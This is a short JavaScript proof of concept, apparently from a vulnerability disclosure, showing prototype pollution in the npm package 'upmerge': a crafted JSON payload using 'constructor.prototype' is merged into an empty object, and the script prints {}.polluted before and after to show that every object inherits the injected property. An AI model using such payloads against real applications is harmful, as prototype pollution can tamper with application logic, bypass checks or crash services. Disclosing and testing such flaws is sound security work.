let upmerge = require('upmerge');
let payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
obj = {};
console.log({}.polluted);
upmerge.merge({}, JSON.parse(payload));
console.log({}.polluted);